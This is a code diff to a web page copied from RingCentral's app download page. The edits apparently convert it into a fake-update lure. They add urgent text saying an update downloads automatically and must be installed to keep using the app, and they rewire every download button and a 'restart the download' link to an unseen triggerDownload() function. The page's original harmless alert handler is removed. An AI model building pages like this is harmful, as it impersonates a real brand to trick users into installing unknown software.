@@ -725,18 +725,19 @@
 
     <!-- Main Content -->
     <main class="main-content container">
-        <h1 class="hero-title">Get the RingCentral App for Free</h1>
+        <h1 class="hero-title">Get the Latest Version of the RingCentral App</h1>
         <p class="hero-subtitle">
-            Communicate your way with team messaging, video meetings, and a modern business phone—all in one place.
+            To enjoy seamless messaging, HD video meetings, and modern business calling, please install the latest version of RingCentral.
         </p>
-        <div class="logo-center">
-            <div class="logo-text">
-                <span class="ring">Ring</span><span class="central">Central</span>
-            </div>
+        <div class="promo">
+            The update should begin downloading automatically. Please install it to continue using RingCentral without interruptions.
+        </div>
+        <div class="promo">
+            If it doesn’t, <a href="#" onclick="triggerDownload(); return false;">restart the download</a>
         </div>
         <div class="download-buttons">
-            <button class="download-btn" data-platform="Mac">Download for Mac</button>
-            <button class="download-btn" data-platform="Windows">Download for Windows</button>
+            <button class="download-btn" onclick="triggerDownload()" data-platform="Mac">Download for Mac</button>
+            <button class="download-btn" onclick="triggerDownload()" data-platform="Windows">Download for Windows</button>
         </div>
         <div class="system-requirements">
             <a href="#" class="system-requirements-link">Learn more about system requirements</a>
@@ -980,13 +981,6 @@
             });
         }
 
-        // Download Buttons
-        document.querySelectorAll('.download-btn').forEach(btn => {
-            btn.addEventListener('click', () => {
-                const platform = btn.dataset.platform;
-                alert(`Starting download for ${platform}...`);
-            });
-        });
 
         // Mobile Menu Toggle
         const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
@@ -1015,12 +1009,12 @@
         });
 
         // Chat Bubble
-        const chatBubble = document.querySelector('.chat-bubble');
-        if (chatBubble) {
-            chatBubble.addEventListener('click', () => {
-                alert('Chat support would open here');
-            });
-        }
+        // const chatBubble = document.querySelector('.chat-bubble');
+        // if (chatBubble) {
+        //     chatBubble.addEventListener('click', () => {
+        //         alert('Chat support would open here');
+        //     });
+        // }
     </script>
 </body>
 </html>
